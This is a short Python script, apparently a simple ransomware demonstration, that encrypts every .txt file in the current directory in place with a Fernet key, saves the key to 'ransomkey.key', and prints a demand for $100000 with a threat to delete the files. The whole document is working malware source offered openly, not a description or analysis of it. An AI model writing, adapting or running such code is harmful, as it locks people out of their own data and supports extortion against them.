#!/usr/bin/env python3
import glob
from cryptography.fernet import Fernet

currDirFiles = glob.glob("*.txt")
print("Tet files to encrypt: \n" + str(currDirFiles))

#Generate key and save to file
key = Fernet.generate_key()
keyfile=open("ransomkey.key", "wb")
keyfile.write(key)

#Encrypt every *.txt file
for file in currDirFiles:
	#Encrypt file content
	with open(file, "rb") as thefile:
		fileContent = thefile.read()
	fileCyphetext = Fernet(key).encrypt(fileContent)

	#Write cyphertext to file

	with open(file, "wb") as thefile:
		thefile.write(fileCyphetext)


print("\n ****Your files have been encrypted!!! Send me $100000 or I will delete them.")
